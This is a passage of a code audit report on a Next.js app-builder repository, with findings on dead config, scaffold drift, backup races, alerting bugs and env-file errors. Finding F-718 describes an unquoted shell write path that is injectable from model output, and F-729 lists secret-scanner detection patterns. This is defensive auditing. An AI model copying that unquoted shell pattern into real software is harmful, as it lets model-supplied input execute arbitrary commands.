  `pnpm exec prisma generate` (`Dockerfile:28`) with a direct binary call for the reasons in
  `.cursor/lessons-learned.md:77-80`.

### F-717 [HIGH] Two crons documented as live have no route, and the monitor for one was deleted rather than the route restored

- Area: P
- Location: `.env.example:136,150` (in scope). Related, outside scope:
  `lib/observability/system-checks.ts:9-13`, `AGENTS.md:57,78`, `README.md:85,127,180`,
  `.cursor/README.md:60,63,64`, `.cursor/rules/multi-agent-ownership.mdc:39-40`
- What happens: I listed `app/api/cron/` — it contains **14** route directories.
  `/api/cron/reap-sandboxes` and `/api/cron/check-sandbox-providers` are not among them.
  `.env.example:136` still documents `POST /api/cron/reap-sandboxes (every 10 min)` and
  `.env.example:150` still offers `SANDBOX_IDLE_MINUTES=5`, which is read nowhere in the
  repo (I scanned every `process.env.*` read). `lib/observability/system-checks.ts:9-13`
  explains that `reap-sandboxes` was **removed from the monitor list** because it "outlived
  its route and kept `/admin/health` permanently red", and
  `tests/unit/cron-monitor-coverage.test.ts` now pins "no monitored name without a route" —
  locking the absence in.
- Trigger: an operator configures the Coolify scheduled tasks from `.env.example` /
  `README.md`.
- Impact: two schedules 404 forever with nothing reporting it. In this checkout the sandbox
  subsystem is gone (`lib/workspace/sandbox-request.ts:1-4`), so the _functional_ loss is nil
  — but the config surface still asks operators to wire, and pay attention to, two endpoints
  that cannot answer, and the fix applied last time was to silence the alarm. That is the
  precedent worth flagging.
- Confidence: Confirmed
- Suggested fix: delete the two cron lines and `SANDBOX_IDLE_MINUTES` from `.env.example`
  (and the matching `README.md` / `.cursor` text) in the same commit, and extend
  `tests/unit/cron-monitor-coverage.test.ts` to also fail when `.env.example` or `README.md`
  names a cron path with no route — the documentation is part of the contract.

### F-718 [HIGH] Morph Fast Apply is a configurable, keyed, billable feature with no applier, and its writer is shell-injectable from model output

- Area: P
- Location: `lib/morph-fast-apply.ts:77-93,131,137,160-229,248-263`
  (related `.env.example:51-53`, `lib/settings/registry.ts:156-162`,
  `docker-compose.yml:60`, `app/api/generate-ai-code-stream/route.ts:884-888`)
- What happens: two separate defects in one module.
  (a) **Dead feature with a live config surface.** Every write path takes `sandbox: any` and
  targets `/home/user/app/…` through `sandbox.files`, `sandbox.runCommand`,
  `sandbox.commands.run` or `sandbox.runCode`, plus `global.sandboxState` /
  `global.existingFiles`. There is no sandbox. The generation route says so in its own comment
  at lines 884-888: "`parseMorphEdits` / `applyMorphEditToFile` have no production caller. So
  with a Morph key saved in Admin → Configuration, every follow-up edit reported SUCCEEDED
  with an explanation in chat and left the project's files untouched." Meanwhile
  `.env.example:51-53` advertises it, `lib/settings/registry.ts:156-162` exposes
  `tooling.morph.apiKey` on `/admin/config`, `docker-compose.yml:60` forwards
  `MORPH_API_KEY`, and this tree has a live 51-char Morph key configured.
  (b) **Command injection on the write path.** `parseMorphEdits:79` takes `target_file` from
  **model output**. `writeFileToSandbox:179` runs `mkdir -p ${dir}` and `:184` runs
  `cat > ${normalizedPath}` with the value unquoted, and `readFileFromSandbox:131,137` run
  `cat ${normalizedPath}` the same way. The "escaping" on line 184 is inert:
  `.replace(/\n/g, '\n')` replaces a newline with a newline and `.replace(/\$/g, '\$')` is
  `'$'` in a JS string literal — both are no-ops.
- Trigger: (a) an operator pastes a Morph key. (b) would require restoring an applier;
  today the injection is latent.
- Impact: (a) operators configure and pay for a feature that cannot work, and follow-up edits
  report success having changed nothing — the exact failure the route's comment describes.
  (b) if the applier is ever restored, a model-emitted path executes arbitrary shell in the
  execution environment.
- Confidence: Confirmed
- Suggested fix: delete `lib/morph-fast-apply.ts` and the `tooling.morph.apiKey` registry
  entry, the `.env.example` block and the compose variable together. If Morph is wanted back,
  re-implement against the in-process file map that generation now uses — with no shell at all
  — and validate the target path through `sanitizeGenerationPath`
  (`lib/export/files.ts:26` already does this for the same class of model-supplied path).

### F-719 [HIGH] The exported/published project scaffolds pin Next 14 / React 18 and carry sandbox host and port settings

- Area: P
- Location: `lib/stacks/templates/nextjs.ts:9,13,18-20,37-44,136`; `lib/stacks.ts:81,148`;
  `lib/stacks/templates/static-html.ts:9-13`; `lib/stacks/templates/react.ts:22,30-37`
  (consumed by `lib/export/readme.ts:20-22` and the publish deploy repo)
- What happens: the NEXTJS scaffold writes `"next": "14.2.18"`, `"react": "^18.2.0"`,
  `"react-dom": "^18.2.0"` (`nextjs.ts:18-20`) while the product itself runs Next 16.3.1 and
  React 19.2.8 (`package.json:90,95-96`) and the generation prompts target the App Router.
  `next.config.mjs` is written with
  `allowedDevOrigins: ['.e2b.app', '.e2b.dev', '.vercel.run', 'localhost']`
  (`nextjs.ts:40`) — E2B/Vercel sandbox hosts. `devCommand` is
  `next dev -p 5173 -H 0.0.0.0` for NEXTJS and `npx serve . -l 5173` for STATIC_HTML
  (`lib/stacks.ts:81,148`), and `lib/export/readme.ts:21` prints it as the user's "Start the
  dev server" step. The package is named `sandbox-app` and the placeholder page reads
  "Sandbox ready. Next.js App Router" (`nextjs.ts:9,136`); the STATIC_HTML index says "Sandbox
  ready … served with npx serve" and loads Tailwind from `https://cdn.tailwindcss.com`
  (`static-html.ts:9-13`), the play CDN that is explicitly not for production. The REACT
  scaffold omits `@types/react` / `@types/react-dom` while setting `strict: true`
  (`react.ts:30-37,111-123`).
- Trigger: any ZIP export (`GET /api/projects/[id]/export`) or publish, on any project.
- Impact: generated code written against React 19 / Next 15+ APIs passes the in-process
  esbuild check (`lib/validation/build-check.ts:215`) and then fails `next build` for the user
  on Next 14.2.18. The exported dev server binds `0.0.0.0:5173` for no reason the user can
  see; a deploy anywhere other than an E2B host trips `allowedDevOrigins`; the React export
  cannot typecheck; and the first thing a paying user sees in their own repo is the word
  "Sandbox".
- Confidence: Confirmed
- Suggested fix: pin the scaffolds to the same major versions the generation prompts target
  (and add a test that asserts scaffold `next`/`react` majors match `package.json`'s), delete
  `allowedDevOrigins` and the `-p 5173 -H 0.0.0.0` / `-l 5173` flags, rename `sandbox-app`,
  rewrite the placeholder pages, add `@types/react*` to the React scaffold, and replace the
  Tailwind play CDN with the same PostCSS setup the other scaffolds use.

### F-720 [HIGH] `packages/create-open-lovable` is unreferenced, recursively deletes a user-named directory, and writes plaintext API keys

- Area: P
- Location: `packages/create-open-lovable/lib/installer.js:25-37,75,138-190`;
  `packages/create-open-lovable/package.json:4,7-9`
- What happens: the package declares a `bin` (`create-open-lovable`) and is described as
  bootstrapping "your choice of sandbox provider" — e2b / modal / daytona, none of which exist
  here. `installer.js:36` calls `fs.remove(projectPath)` where `projectPath` is
  `path.join(config.path, config.name)` from CLI flags, after one `confirm` prompt.
  `installer.js:188` writes a `.env` containing the API keys the user just typed at the prompt,
  and `:189` derives `.env.example` from it with `envContent.replace(/=.+/g, '=your_key_here')`
  — a regex that leaves an empty or newline-containing value untouched. `installer.js:75` runs
  `execSync('npm install')` in a pnpm-only repo. `installer.js:110,112` copy
  `.eslintrc.json` and `next.config.js`, neither of which exists in this repo (it has
  `eslint.config.mjs` and `next.config.ts`), so the generated project silently has no lint
  config.
- Trigger: anyone running the CLI — `create-open-lovable --path <dir> --name <name>`.
- Impact: a mistyped `--path`/`--name` pair recursively deletes an existing directory behind a
  single yes/no prompt; the scrubbing regex can leak a real key into a file whose whole purpose
  is to be committed; and the scaffolded project targets three removed sandbox providers. The
  package is excluded from the Docker context (`.dockerignore:15`) and from `tsc`
  (`tsconfig.json:34-35` matches only `.ts`/`.tsx`), so nothing in the repo checks it.
- Confidence: Confirmed
- Suggested fix: delete the package. If a scaffolder is still wanted, it should not delete
  directories at all (refuse a non-empty target), should never write a `.env` from prompted
  secrets, and should be built from a real template directory rather than by copying the live
  source tree.

### F-721 [MEDIUM] Eight `scripts/verify-*` files are wired to nothing, and one asserts three stacks that were deleted

- Area: P
- Location: `scripts/verify-stack-pipeline.mjs:16-19,36,38-39,84-89,93-97`;
  `scripts/verify-plan-ui.ts`, `scripts/verify-plan-build-fn.ts`,
  `scripts/verify-plan-build.mjs`, `scripts/verify-projects-api.mjs`,
  `scripts/verify-projects-data.mjs`, `scripts/verify-usage-costs.mjs`,
  `scripts/verify-usage-http.mjs`; `knip.json:2`
- What happens: `lib/verify/orchestrator.ts` invokes exactly two scripts —
  `scripts/check-public-routes.ts:90` and `scripts/check-destructive-migrations.ts:108`
  (grepped). `package.json:7-28` names `verify.ts`, `verify-bypass.ts`, `smoke-test.ts`,
  `ensure-test-db.ts`, `migrate-test-db.ts`, `rollback.ts`. The eight `verify-*` files above
  are referenced by nothing. `scripts/verify-stack-pipeline.mjs:16-19` asserts `ASTRO`, `VUE`
  and `SVELTE` stacks — `lib/stacks.ts:13` has three ids and `AGENTS.md:41` says explicitly
  "There is no Astro, Vue or Svelte stack" — and `:93-97` asserts `GENERIC_NODE_SANDBOX` and
  E2B template ids. It also re-implements route derivation (`:47-79`) that
  `lib/stacks/routes.ts` owns, so the two copies can drift silently. `knip.json:2` ignores
  `scripts/**`, so the dead-code reporter in `verify` is configured not to look here.
- Trigger: n/a — that is the point; nothing triggers them.
- Impact: 1,100 lines of assertions that read as coverage and are executed by nobody; at least
  one of them would now fail. A future agent reading `verify-stack-pipeline.mjs` learns that
  six stacks exist. This is the same shape as the removed six-way CI matrix
  (`.github/workflows/verify.yml:76-79`).
- Confidence: Confirmed
- Suggested fix: delete the eight scripts, moving any assertion worth keeping into
  `tests/unit/` where vitest runs it. Remove `scripts/**` from `knip.json:2` so the next
  orphan is reported.

### F-722 [MEDIUM] `runDbBackup` never consults `latestRunningDbBackup()`, and a killed backup stays `running` forever

- Area: P
- Location: `lib/backup/db.ts:66-124`, `lib/backup/runs.ts:44-62,121-130`, `lib/backup/admin.ts:40-42`
- What happens: `latestRunningDbBackup()` exists and `getBackupAdmin` renders it as
  `running` on `/admin/backups`, but `runDbBackup` never reads it — it goes straight to
  `startBackupRun('db')`. There is also no reaper for `BackupRun` rows left in `running`: the
  only writers are the success/failure paths inside the same process.
- Trigger: the 02:00 cron overlapping an operator's "Back up now"; or any backup whose process
  is killed (redeploy, OOM) mid-`pg_dump`.
- Impact: concurrent runs both `pg_dump` into `/data/tmp`, doubling peak disk use on a volume
  that `assertFreeSpaceForLargeOp` was added to protect (and which is a no-op in the CLI case
  — F-726). A killed run leaves a permanent `running` row, and the code's own comment at
  `lib/backup/db.ts:105` says "a lost failure row looks like still running" — so
  `/admin/backups` shows a backup in progress indefinitely and the "Back up now" button stays
  disabled.
- Confidence: Confirmed
- Suggested fix: have `runDbBackup` refuse (returning a clear `ok: false` detail) when a `db`
  run has been `running` for less than the stale threshold, and add a pass — in
  `thin-checkpoints`, next to the other prunes — that fails `BackupRun` rows still `running`
  past that threshold.

### F-723 [MEDIUM] The Sentry API wrapper turns every failure into zeros, then the quota check emails admins about it daily

- Area: P
- Location: `lib/observability/sentry-api.ts:3,24-31,40,42,44,73,82`;
  `lib/observability/quota.ts:52-74`
- What happens: three problems compound.
  (a) `SENTRY_API_BASE` is hardcoded `https://sentry.io/api/0` while
  `ObservabilityRuntimeConfig` carries a `region` (`lib/observability/runtime-config.ts:31`)
  that is never used — an EU-region org 404s on every call.
  (b) Each call is wrapped in `.catch(() => null)` / `.catch(() => [])` (lines 40, 42, 44, 82),
  so a 401, a 404 or a network failure produces `accepted: 0`, `dropped: []`,
  `topIssues: []`, `findIssueByFingerprint → null`. That is the
  `[]`-is-not-nothing rule (`.cursor/lessons-learned.md:52-56`) broken in four places.
  (c) `quota.limit` falls back to `Math.max(used, 1)` when `projectInfo.quota.maxRate` is
  absent (line 73) — which it is for most Sentry projects — so `quotaRatio = used/used = 1.0`
  whenever there is any traffic.
- Trigger: `POST /api/cron/observability-quota` (daily) with a revoked token, a
  non-`sentry.io` region, or simply a project with no per-project rate limit set.
- Impact: two false daily emails to every admin, forever. `quotaRatio >= 0.8`
  (`lib/observability/quota.ts:64`) fires "Sentry quota is above 80%" for a project with no
  quota configured; and `findIssueByFingerprint → null` makes `receiptStale` true
  (`:60`), so `mismatch` fires "heartbeat sent but not visible in Sentry" as well. Neither has
  a dedupe flag (unlike `heartbeat.ts:71`, which requires two consecutive failures). Real
  quota exhaustion, meanwhile, reads as 0 events used.
- Confidence: Confirmed
- Suggested fix: build the API base from `config.region`; let the three `sentryGet` calls
  throw so the caller can record `status: 'unavailable'` and skip alerting instead of
  asserting zeros; and treat an absent `maxRate` as "no quota information" (`limit: null`,
  no warning) rather than as `used`. Add an alerted-flag for the mismatch and quota emails,
  the way `maybeAlertLowSpace` does.

### F-724 [MEDIUM] The uptime, certificate and Sentry-API probes have no request timeout

- Area: P
- Location: `lib/observability/uptime.ts:10`; `lib/observability/sentry-api.ts:24-26`
  (contrast `lib/seo/live.ts:6-7`, which does it correctly)
- What happens: `checkSiteUptime` calls `fetchFn(target, { redirect: 'manual' })` with no
  `AbortSignal` and no `signal: AbortSignal.timeout(...)`. `sentryGet` likewise. Node's fetch
  has no default request timeout.
- Trigger: an origin that accepts the TCP connection and never responds — a half-open load
  balancer, a saturated app, a hung Sentry endpoint.
- Impact: the cron handler hangs indefinitely. Because `withCronRun` only writes its row when
  the body settles (F-708), a hung probe leaves no `CronRun` at all, so `/admin/health` shows
  `check-uptime` as stale/never-run — the same reading it would give if the schedule were
  simply not configured. The one monitor whose entire output is the verdict goes quiet exactly
  when the site is in trouble.
- Confidence: Confirmed
- Suggested fix: pass `signal: AbortSignal.timeout(10_000)` (uptime) and a similar bound for
  the Sentry calls, and classify an abort as a failed check with a `timeout` detail rather than
  a thrown run.

### F-725 [MEDIUM] `docker-compose.yml` passes no build args, so every `NEXT_PUBLIC_*` value is `undefined` in the client bundle

- Area: P
- Location: `docker-compose.yml:25-27,45,92`; `Dockerfile:19-29`
- What happens: the `build:` block declares only `context` and `dockerfile` — no `args`. The
  builder stage sets `GIT_SHA` and a placeholder `DATABASE_URL` and nothing else
  (`Dockerfile:23-27`). `NEXT_PUBLIC_*` variables are inlined into client chunks at
  `next build` time, so `NEXT_PUBLIC_APP_URL` (`docker-compose.yml:92`, marked "Required") and
  `NEXT_PUBLIC_WORKSPACE_NAME` (`:45`) are baked in as `undefined`; listing them under
  `environment:` only affects the runtime process.
- Trigger: every Coolify deploy.
- Impact: any client component reading `process.env.NEXT_PUBLIC_WORKSPACE_NAME` gets the
  `'Navroop'` fallback rather than the operator's configured name, and any client read of
  `NEXT_PUBLIC_APP_URL` is `undefined`. Server-side reads are fine, which is why this survives:
  `assertInternalOrigin` (`lib/api/internal-origin.ts:98`) validates the _runtime_ value and
  passes, so the boot check certifies a variable the browser bundle never received.
- Confidence: Confirmed for the missing build args and Next's inlining semantics; Likely for
  the user-visible effect (depends on which client components read them — `lib/email/client.ts:17`
  and `lib/email/templates/layout.ts:2` are server-side and unaffected).
- Suggested fix: add `build.args` for every `NEXT_PUBLIC_*` variable and declare the matching
  `ARG`/`ENV` pair in the builder stage, or move those values to a runtime-readable config
  endpoint. Then assert it: a boot check that fails when a required `NEXT_PUBLIC_*` was not
  present at build time.

### F-726 [MEDIUM] `assertFreeSpaceForLargeOp` is a no-op for every CLI-invoked backup and restore

- Area: P
- Location: `lib/runtime/data-dir.ts:122-124,337-344`; callers `lib/backup/db.ts:70`,
  `lib/backup/restore.ts:87`
- What happens: the guard returns early when `status.freeBytes == null`.
  `getDataDirStatus()` returns `unprobedStatus(...)` — with `freeBytes: null` — until
  `ensureDataDir()` has run in **this process**. `ensureDataDir` is called only from
  `instrumentation.ts:7`, i.e. inside the Next server. `scripts/backup-db.ts`,
  `scripts/restore-db.ts` and `scripts/verify-storage.ts` are standalone `tsx` processes that
  never call it.
- Trigger: `npx tsx scripts/backup-db.ts` or `scripts/restore-db.ts --key …`, and the
  `pre-migrate` backup on every production boot (`scripts/pre-migrate.ts:59`).
- Impact: the 2 GB free-space precondition silently does not apply on the paths most likely to
  fill the volume — a full `pg_dump` and a full restore download. A dump that runs the volume
  out of space fails partway, and on the `pre-migrate` path that failure blocks the deploy.
- Confidence: Confirmed
- Suggested fix: make `assertFreeSpaceForLargeOp` probe the disk itself when the cached status
  is unchecked (it can call `readDisk(getDataDir())` directly), and treat "cannot determine
  free space" as a loud refusal for a large operation rather than a silent pass.

### F-727 [MEDIUM] The hourly tmp sweep deletes the working directory of any backup or restore that runs longer than an hour

- Area: P
- Location: `lib/runtime/data-dir.ts:346-369,371-380` (callers `lib/backup/db.ts:82`,
  `lib/backup/restore.ts:91`, cron `sweep-tmp`)
- What happens: `withTmpDir` creates `mkdtempSync(join(tmpDir(root), 'op-'))` and the backup
  writes its dump inside. `sweepTmp` walks `/data/tmp` and `rmSync(full, { recursive: true,
force: true })` any entry whose `mtimeMs` is more than `TMP_MAX_AGE_MS` (1 hour) old. A
  directory's mtime changes when entries are added or removed, not when an existing file is
  appended to — and `pg_dump --file` creates the file once then writes into it. So the `op-…`
  directory's mtime stays at creation time.
- Trigger: a `pg_dump` or `pg_restore` (or a `downloadBackupObject` stream) that takes over an
  hour, with the hourly `sweep-tmp` cron firing during it. Both are exactly the operations that
  get slow as the database grows.
- Impact: the dump file is deleted underneath `pg_dump`, so the backup fails with a confusing
  I/O error, `finishBackupRun('failed')` records it, and every admin gets a backup-failure
  email — recurring nightly once the database is big enough, with no indication that the
  cleaner is the cause. On the restore path the downloaded dump vanishes mid-`pg_restore`.
- Confidence: Confirmed from the code; Likely to be hit only once a dump exceeds an hour.
- Suggested fix: have `withTmpDir` write a marker (or `utimesSync` the directory on a timer)
  that `sweepTmp` respects, or — simpler — put in-flight operations under
  `/data/tmp/active/` and have the sweep skip that subtree entirely. Never let a cleaner
  delete a path another process holds open.

### F-728 [MEDIUM] `readVolumeIdFile` treats an unreadable file as absent and then overwrites it with a new id

- Area: P
- Location: `lib/runtime/data-dir.ts:220-238,262-273` (consumer `persistVolumeIdentity:314-335`)
- What happens: `readVolumeIdFile` returns `null` from a blanket `catch` (line 231-233) — for a
  missing file, an EACCES, a partial read, or malformed JSON alike. `ensureDataDir:263-266`
  then mints a fresh `randomUUID()` and calls `writeVolumeIdFile`, which is a plain
  `writeFileSync` straight to the destination (line 237) with no temp-file-and-rename, unlike
  `writeCacheJson:403-428` in the same file.
- Trigger: a transient read failure on `/data/.volume-id`, or a crash during a previous
  non-atomic write that left the file truncated.
- Impact: the volume's identity is destroyed and replaced. `persistVolumeIdentity:323-327`
  then reports `changed: true` with "This is a fresh volume or a lost mount",
  `/api/health` and `/admin/health` show a lost volume, and `scripts/smoke-test.ts:242` can
  report "silent lost volume". An operator is sent to investigate a storage incident that did
  not happen — and the real previous id is gone, so the investigation cannot conclude.
- Confidence: Confirmed
- Suggested fix: distinguish ENOENT (genuinely absent — mint an id) from every other read
  error (report `checked: true, writable: false` with the real reason and do **not** write),
  and make `writeVolumeIdFile` atomic the way `writeCacheJson` already is.

### F-729 [MEDIUM] The secret scanner has four rules, no rule for any current AI-provider key format, and no ignore list for other worktrees

- Area: P
- Location: `lib/secret-scan.ts:7-14,29-35`; `scripts/secret-scan.ts:21,71-89,145-151,188`
- What happens: `RULES` covers PEM private keys, `AKIA…`, `ghp_…` and a quoted
  `api_key|secret|token|password = <20+ chars of [A-Za-z0-9_\-/+=]>`. There is no rule for
  `sk-proj-` / `sk-ant-` / `AIza` / `github_pat_` / `ghs_` / Stripe / Slack / a JWT / or a
  `postgres://user:pass@host` URI. The `generic-secret-assignment` rule requires the value to be
  quoted, so a `.env`-shaped `KEY=value` line never matches. In tree mode
  (`scripts/secret-scan.ts:143,150`) `listFiles` walks everything except
  `node_modules`, `.git`, `.next` and `coverage` (`:21`) — `.worktrees`, `.claude`,
  `public/uploads` and the `.env*` files are all scanned — and `abort()` on any unreadable path
  (`:76,85`) exits 2, which the script correctly calls a broken gate.
- Trigger: staging a file containing an OpenAI, Anthropic or Google key; or running
  `node scripts/secret-scan.ts` in a tree that has a sibling worktree.
- Impact: the pre-commit gate passes the credential formats this project actually uses —
  `.env.local:9,11,17` hold live Gemini, OpenAI and Morph keys today, and none of the four
  rules would match them. In the other direction, tree mode reports another branch's files and
  exits 2 on any locked path, which trains people to ignore exit 2.
- Confidence: Confirmed
- Suggested fix: add prefix rules for the major providers (`sk-ant-`, `sk-proj-`, `sk-`,
  `AIza`, `github_pat_`, `ghs_`, `xox[baprs]-`, `glpat-`) plus an unquoted
  `NAME=<high-entropy>` rule and a `postgres(ql)?://[^:]+:[^@]+@` rule; and add
  `.worktrees`, `.claude`, `public/uploads` and `.data` to `shouldScanPath`'s ignore list so
  tree mode scans this checkout only.

### F-730 [MEDIUM] `beginLockHeartbeat` ignores a failed renewal, so a lost project lock is silent

- Area: P
- Location: `lib/projects/lock.ts:101-116,160-175` (context: the NAV-03 note at `:196-205`)
- What happens: `renewLock` returns `{ ok: false, error: 'Lock is not held' }` when the UPDATE
  matches no row — the lock expired, or someone else took it. `beginLockHeartbeat:162-167`
  only catches _thrown_ errors; the `{ ok: false }` result is discarded. The interval keeps
  firing every 60 s against a lock the process no longer holds, and nothing logs it.
- Trigger: 15 consecutive renew failures (a DB blip, or an event loop starved by a long
  synchronous step such as a Lighthouse run or an axe sweep) during a generation, import,
  publish or audit.
- Impact: the project becomes acquirable while work is still writing to it. A second run then
  takes the lock and writes the same `Project.lastCode` — precisely the corruption the module's
  own comment (`:196-205`) says the lock exists to prevent — and the first run has no idea. The
  `holdProjectLock` wrapper was built to make re-entry impossible to forget; the same rigour is
  missing for renewal loss.
- Confidence: Confirmed
- Suggested fix: log `{ ok: false }` at warn with the projectId, and give `LockHold` a way to
  signal loss to the work it wraps (an `AbortSignal`, or a `lost` flag `withProjectLock`
  checks before its final write) so the run can abort rather than write under a lock it lost.

### F-731 [MEDIUM] Two duplicate-title and "substring exists somewhere" SEO checks produce a false verdict on almost every project

- Area: P
- Location: `lib/seo/checks/metadata.ts:125-137`; `lib/seo/checks/page-basics.ts:10`;
  `lib/seo/checks/open-graph.ts:8-11`; `lib/seo/checks/metadata.ts:35`
- What happens: (a) the duplicate-title check builds
  `allTitles = [doc.title, ...fileTitles]`, where `doc.title` is the live homepage title and
  `fileTitles` extracts titles from the source files — so `doc.title` is _always_ a duplicate
  of whichever source title produced it. `new Set(allTitles).size < allTitles.length` is
  therefore true whenever a preview exists and any title was extracted, regardless of whether
  the project's routes actually share a title.
  (b) Several checks pass if a substring appears anywhere in the concatenated source:
  `viewport = doc.viewport || /viewport/i.test(fileBlob)` (`page-basics.ts:10`),
  `ogTitle = doc.og['og:title'] || /og:title/.test(blob)` (`open-graph.ts:8`), and
  `canonical` via `/rel=["']canonical["']|alternates:\s*\{[^}]*canonical/` on any file
  (`metadata.ts:35`). A CSS media-query comment mentioning "viewport", or the string
  `og:title` inside a helper, passes the check.
- Trigger: every SEO audit.
- Impact: a permanent false `medium` finding on every project (a), plus systematically
  optimistic passes for viewport, Open Graph and canonical (b). Both feed
  `seoScoreFromFindings` (`lib/signals/score.ts:90-95`), so `/admin/quality`'s SEO number is
  built from a guaranteed false negative and a guaranteed false positive, and the "Fix all"
  instruction (`lib/seo/fix-instruction.ts:17-25`) asks the model to fix a duplicate title
  that does not exist.
- Confidence: **Confirmed by reproduction.** I ran the exact condition from
  `metadata.ts:127`. `dupTitleFires('Saffron Clay — Bandra West', ['Saffron Clay — Bandra
West'])` → `true` (single page, false positive). `dupTitleFires('Home — Saffron Clay',
['Home — Saffron Clay', 'Menu — Saffron Clay'])` → `true` as well — two genuinely _distinct_
  route titles still trip it, because the live title duplicates the first file title. It only
  returns `false` when there is no preview at all. So the check is not merely noisy: it is
  true in every case it is meant to distinguish between, and carries no information.
- Suggested fix: compare titles across _routes_, which means auditing more than the homepage —
  or drop the check until multi-route auditing exists rather than asserting it from one page.
  For (b), scope each check to the file that owns the concern (the root layout / head for
  viewport and canonical, the page's metadata export for OG) instead of a whole-repo substring
  test, and report "could not determine" where the file cannot be located.

### F-732 [MEDIUM] `/admin/quality` runs 2×N full scans of `QualitySignal` and performs a write on render

- Area: P
- Location: `lib/signals/metrics.ts:35-43,100-120,122-131`
- What happens: `getQualityMetrics` does an unbounded
  `prisma.qualitySignal.findMany` (no `take`) for the range.
  `getPromptVersionHistory:104-119` maps over **every** `PromptVersion` row and, per version,
  calls `getQualityMetrics` _and_ `getOverallQualityScore` — which calls `getQualityMetrics`
  again — inside a `Promise.all` with no concurrency bound. So V prompt versions cost 2V
  unbounded scans, all in flight at once. Separately, `getQualityDashboard:123` calls
  `settleIdleProjects()` — a **write** — as the first thing a GET of the dashboard does.
- Trigger: loading `/admin/quality`, increasingly slowly as versions and signals accumulate;
  `getActivePromptVersion` rolls a new version on every stack-prompt edit
  (`AGENTS.md:62`), so V grows with normal development.
- Impact: at ten versions, twenty concurrent full-table reads per page load, each
  materialising every signal row in the window into Node memory — the dashboard becomes the
  slowest page in the product and a source of connection-pool pressure. And two admins opening
  it concurrently both run `settleIdleProjects`, so a read-only screen mutates data twice with
  no idempotency guard.
- Confidence: Confirmed
- Suggested fix: aggregate in SQL — one grouped query returning `kind`, `promptVersion`,
  `avg(value)`, `count(*)` for the range — instead of loading rows and reducing in JS, and pass
  the already-computed metrics into `composeOverallScore` rather than recomputing. Move
  `settleIdleProjects` out of the render path onto the cron that already exists for
  maintenance work.

### F-733 [MEDIUM] Fourteen settings-registry env variables are absent from `.env.example`, and three read-in-code variables are undocumented

- Area: P
- Location: `.env.example` (whole file); registry at `lib/settings/registry.ts` (env names at
  `:81,90,98,109,117,126,139,153,161,169,177,185,193,201,209,226,234,245,258,266-…`)
- What happens: I diffed every `env:` / `envAliases:` name in `lib/settings/registry.ts`
  (44 names) against every `NAME=` line in `.env.example` (including commented ones), and
  separately scanned every `process.env.X` read in the repo. Missing from `.env.example` but
  present in the registry: `BACKUP_LOCAL_DIR`, `DEEPSEEK_API_KEY`, `DEEPSEEK_BASE_URL`,
  `ELK_PUBLIC_URL`, `IMAGE_WORKER_MODEL`, `IMAGE_WORKER_TOKEN`, `IMAGE_WORKER_URL`,
  `S3_ACCESS_KEY_ID`, `S3_BUCKET`, `S3_ENDPOINT`, `S3_REGION`, `S3_SECRET_ACCESS_KEY`,
  `UNSPLASH_APPLICATION_ID`, `UNSPLASH_SECRET_KEY`. Read directly in code but undocumented:
  `NAVROOP_FILE_CONTEXT_TOKEN_CAP` (`lib/generation/selective-context.ts:7`),
  `SOURCE_COMMIT` (`lib/deploy/release.ts:13`, `lib/health/check.ts:102`), and the Sentry
  migration set `SENTRY_DSN` / `NEXT_PUBLIC_SENTRY_DSN` / `SENTRY_ENVIRONMENT` /
  `SENTRY_AUTH_TOKEN` / `SENTRY_ORG` / `SENTRY_PROJECT`
  (`lib/observability/migrate-env.ts:34,79-83`), which `.env.example:161-162` mentions only
  in prose. In the other direction, `.env.example` documents `SANDBOX_IDLE_MINUTES` (F-717)
  and the dead AI provider set (F-712).
- Trigger: an operator configuring image generation, Unsplash, S3-alias storage, or the
  first-boot Sentry migration from `.env.example`.
- Impact: whole features (the image worker; Unsplash's app id/secret; the S3 alias names) have
  no documented configuration, so they are discoverable only by reading
  `lib/settings/registry.ts`. That contradicts the project's own admin-settings rule, which
  requires `.env.example` to be split into required-Coolify and optional/admin-managed
  sections.
- Confidence: Confirmed
- Suggested fix: generate the optional section of `.env.example` from `SETTINGS`, and add a
  verify step that fails when a registry `env` name is missing from `.env.example` or when
  `.env.example` names a variable no code reads. That single check also catches F-712 and the
  `.env.example` half of F-717.

### F-734 [MEDIUM] `.env.example` defines `DATABASE_URL`, `AUTH_SECRET`, `NEXTAUTH_URL` and `GROQ_API_KEY` twice with different values

- Area: P
- Location: `.env.example:6 vs :58`, `:7 vs :65`, `:8 vs :67`, `:29 vs :42`
- What happens: the file has a "COOLIFY" block at the top and a local-development block below.
  Both set `DATABASE_URL` (a compose `postgres:5432` URL at line 6, a `127.0.0.1:5433` URL at
  line 58), both set `AUTH_SECRET`, both set `NEXTAUTH_URL` (an FQDN vs `localhost:3000`), and
  `GROQ_API_KEY` appears at both 29 and 42. `dotenv` builds an object, so the **later**
  occurrence wins.
- Trigger: `cp .env.example .env` — the documented first step.
- Impact: an operator who fills in the Coolify block at the top and deploys gets the
  development values, because lines 58/65/67 silently override lines 6/7/8. The failure looks
  like "the app cannot reach the database" on a correctly configured deployment. It also makes
  the file unusable as a reference: there is no way to tell which of two definitions is live
  without knowing dotenv's precedence.
- Confidence: Confirmed
- Suggested fix: one variable, one definition. Keep the required-for-Coolify block and comment
  out the local-development alternatives (or move them to a separate `.env.local.example`),
  and add the duplicate-key check to the verify step proposed in F-733.

### F-735 [MEDIUM] `logError` drops the stack trace and never reaches Sentry

- Area: P
- Location: `lib/logger.ts:40-45,54-57` (contrast `lib/observability/track.ts:31-44`)
- What happens: `logError` reduces an error to `error.message` and writes one JSON line. It
  does not include `error.stack`, `error.cause`, or the error's constructor name, and it does
  not call `Sentry.captureException`. The server SDK is initialised without a
  `captureConsoleIntegration` (`lib/sentry/options.ts:43-49`), so `console.error` does not
  reach Sentry either. Only `trackFailure` (`lib/observability/track.ts:36`) captures.
- Trigger: every `logError` call site — including `lib/runtime/shutdown.ts:38`,
  `lib/audit/log.ts:111`, `lib/projects/lock.ts:163,182` and
  `lib/export/archive.ts:42`.
- Impact: the repo's designated error logger produces a one-line message with no stack, so
  diagnosing a failure means grepping stdout for a string and guessing the call site; and every
  error routed through `logError` rather than `trackFailure` is absent from the error tracker
  that the whole of `lib/observability/` exists to feed. `/admin/health` can show "Healthy"
  while `logError` is firing continuously.
- Confidence: Confirmed
- Suggested fix: include `stack` and `name` in the log line, and have `logError` call
  `trackFailure`'s capture path (respecting `shouldCaptureException`) so there is one error
  road rather than two. Add a level filter so `log.debug` can be turned off in production —
  `appConfig.dev.enableDebugLogging` exists for exactly this and is read nowhere (F-736).

